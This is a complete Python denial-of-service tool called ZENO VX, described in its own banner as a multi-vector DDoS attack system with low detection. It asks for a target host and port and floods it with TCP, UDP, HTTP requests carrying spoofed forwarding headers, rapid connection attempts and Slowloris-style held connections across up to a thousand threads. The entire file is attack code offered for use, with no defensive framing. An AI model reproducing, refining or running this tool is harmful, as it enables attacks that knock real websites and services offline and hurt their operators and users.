#!/usr/bin/env python3
import os
import socket
import threading
import random
import time
import sys
import signal
from concurrent.futures import ThreadPoolExecutor
import argparse

# Konfigurasi
THREADS = 1000
TIMEOUT = 3
DELAY = 0.0001
SOCKET_BUFFER = 65535

class ZenoVX:
    def __init__(self):
        self.target = None
        self.port = None
        self.running = True
        self.packets_sent = 0
        self.lock = threading.Lock()
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, sig, frame):
        print(f"\n\033[91m[!] ZENO-VX Terminated. Total Packets: {self.packets_sent:,}\033[0m")
        self.running = False
        sys.exit(0)

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def banner(self):
        self.clear_screen()
        print("\033[95m" + "█" * 70)
        print("█\033[91m                   ZENO VX - EXTREME EDITION              \033[95m█")
        print("█\033[92m                Multi-Vector DDoS Attack System           \033[95m█")
        print("█\033[93m               High Performance - Low Detections          \033[95m█")
        print("█" * 70 + "\033[0m")
        print("\033[91m[!] SYSTEM INITIALIZED. READY TO DEPLOY.\033[0m\n")

    def get_target_info(self):
        """Get and validate target information"""
        while True:
            try:
                target_input = input("\033[94m[>] Target IP/Domain: \033[0m").strip()
                port_input = input("\033[94m[>] Target Port [default:80]: \033[0m").strip()
                
                # Validate target
                try:
                    self.target = socket.gethostbyname(target_input)
                except socket.gaierror:
                    print("\033[91m[!] Invalid target. Please try again.\033[0m")
                    continue
                
                # Validate port
                self.port = int(port_input) if port_input else 80
                if not 1 <= self.port <= 65535:
                    print("\033[91m[!] Port must be 1-65535\033[0m")
                    continue
                    
                break
            except ValueError:
                print("\033[91m[!] Invalid port number\033[0m")
            except KeyboardInterrupt:
                print("\n\033[91m[!] Operation cancelled\033[0m")
                sys.exit(0)

        print(f"\033[92m[+] Target resolved: {self.target}:{self.port}\033[0m")
        print(f"\033[93m[+] Launching attack with {THREADS} threads...\033[0m\n")
        time.sleep(1)

    def create_socket(self, sock_type=socket.SOCK_STREAM):
        """Create socket with optimized settings"""
        try:
            if sock_type == socket.SOCK_STREAM:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            s.settimeout(TIMEOUT)
            return s
        except Exception as e:
            return None

    def spoof_ip(self):
        """Generate spoofed IP for headers"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def generate_payload(self, attack_type):
        """Generate optimized payloads"""
        if attack_type == 'tcp':
            # Random TCP payload
            return random._urandom(random.randint(512, 2048))
        elif attack_type == 'udp':
            # Large UDP payload
            return random._urandom(random.randint(1024, 65000))
        elif attack_type == 'http':
            # HTTP request with spoofed headers
            spoofed_ip = self.spoof_ip()
            return (f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                   f"Host: {self.target}\r\n"
                   f"User-Agent: {random.choice(self.user_agents)}\r\n"
                   f"X-Forwarded-For: {spoofed_ip}\r\n"
                   f"Accept: */*\r\n"
                   f"Connection: keep-alive\r\n"
                   f"Cache-Control: no-cache\r\n\r\n").encode()
        elif attack_type == 'syn':
            return None  # SYN just connects and disconnects

    def tcp_flood(self):
        """TCP flood attack"""
        while self.running:
            try:
                s = self.create_socket(socket.SOCK_STREAM)
                if s:
                    s.connect((self.target, self.port))
                    s.send(self.generate_payload('tcp'))
                    s.close()
                    
                    with self.lock:
                        self.packets_sent += 1
                        if self.packets_sent % 100 == 0:
                            print(f"\033[92m[+] TCP Packets: {self.packets_sent:,}\033[0m")
            except:
                pass
            time.sleep(DELAY)

    def udp_flood(self):
        """UDP flood attack"""
        while self.running:
            try:
                s = self.create_socket(socket.SOCK_DGRAM)
                if s:
                    payload = self.generate_payload('udp')
                    for _ in range(10):  # Burst mode
                        s.sendto(payload, (self.target, self.port))
                    s.close()
                    
                    with self.lock:
                        self.packets_sent += 10
                        if self.packets_sent % 500 == 0:
                            print(f"\033[93m[+] UDP Packets: {self.packets_sent:,}\033[0m")
            except:
                pass
            time.sleep(DELAY / 2)

    def http_flood(self):
        """HTTP flood with keep-alive"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        while self.running:
            try:
                s = self.create_socket(socket.SOCK_STREAM)
                if s:
                    s.connect((self.target, self.port))
                    payload = self.generate_payload('http')
                    s.send(payload)
                    
                    # Keep connection alive and send more
                    for _ in range(5):
                        s.send(payload)
                    s.close()
                    
                    with self.lock:
                        self.packets_sent += 6
                        if self.packets_sent % 1000 == 0:
                            print(f"\033[96m[+] HTTP Requests: {self.packets_sent:,}\033[0m")
            except:
                pass
            time.sleep(DELAY * 2)

    def syn_flood(self):
        """SYN flood - rapid connect/disconnect"""
        while self.running:
            try:
                for _ in range(50):  # Rapid connections
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(False)
                    try:
                        s.connect_ex((self.target, self.port))
                    except:
                        pass
                    s.close()
                    
                    with self.lock:
                        self.packets_sent += 1
                        
                if self.packets_sent % 10000 == 0:
                    print(f"\033[95m[+] SYN Packets: {self.packets_sent:,}\033[0m")
            except:
                pass
            time.sleep(0.00001)

    def slowloris_attack(self):
        """Slowloris - hold connections open"""
        sockets = []
        
        while self.running:
            try:
                # Create new sockets
                for _ in range(100):
                    try:
                        s = self.create_socket(socket.SOCK_STREAM)
                        if s:
                            s.connect((self.target, self.port))
                            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                            s.send(f"Host: {self.target}\r\n".encode())
                            s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                            # Don't send ending headers, keep connection open
                            sockets.append(s)
                            
                            with self.lock:
                                self.packets_sent += 1
                    except:
                        pass
                
                # Keep existing sockets alive
                for s in sockets[:]:
                    try:
                        s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    except:
                        sockets.remove(s)
                        
                print(f"\033[94m[+] Slowloris Connections: {len(sockets)}\033[0m")
                time.sleep(10)
            except:
                pass

    def start_attack(self):
        """Initialize all attack vectors"""
        self.banner()
        self.get_target_info()
        
        # Clear screen and show attack start
        self.clear_screen()
        print("\033[91m" + "=" * 60)
        print("🔥 ZENO-VX EXTREME ATTACK INITIATED 🔥")
        print("=" * 60 + "\033[0m\n")
        
        # Attack vectors with ThreadPoolExecutor
        attacks = [
            self.tcp_flood,
            self.udp_flood,
            self.http_flood,
            self.syn_flood,
            self.slowloris_attack
        ]
        
        with ThreadPoolExecutor(max_workers=len(attacks) + THREADS) as executor:
            # Submit main attack vectors
            futures = [executor.submit(attack) for attack in attacks]
            
            # Submit additional flood threads
            for _ in range(THREADS):
                executor.submit(random.choice([
                    self.tcp_flood, 
                    self.udp_flood, 
                    self.http_flood,
                    self.syn_flood
                ]))
            
            # Monitor and keep running
            try:
                while self.running:
                    time.sleep(5)
                    total = self.packets_sent
                    print(f"\033[93m[📊] Total Packets Sent: {total:,} | Rate: {total//5:,}/s\033[0m")
            except KeyboardInterrupt:
                self.running = False

def main():
    parser = argparse.ArgumentParser(description='ZENO VX - Advanced DDoS Tool')
    parser.add_argument('--threads', type=int, default=1000, help='Number of threads')
    parser.add_argument('--target', help='Target IP/Domain')
    parser.add_argument('--port', type=int, help='Target port')
    
    args = parser.parse_args()
    
    # Check root/admin privileges
    if os.name == 'posix' and os.geteuid() != 0:
        print("\033[91m[!] This tool requires root privileges for optimal performance.\033[0m")
        print("\033[93m[!] Please run with: sudo python3 zeno_vx.py\033[0m")
        time.sleep(2)
    
    # Start ZENO VX
    zeno = ZenoVX()
    
    # Override with command line args if provided
    if args.threads:
        global THREADS
        THREADS = args.threads
    
    zeno.start_attack()

if __name__ == "__main__":
    main()
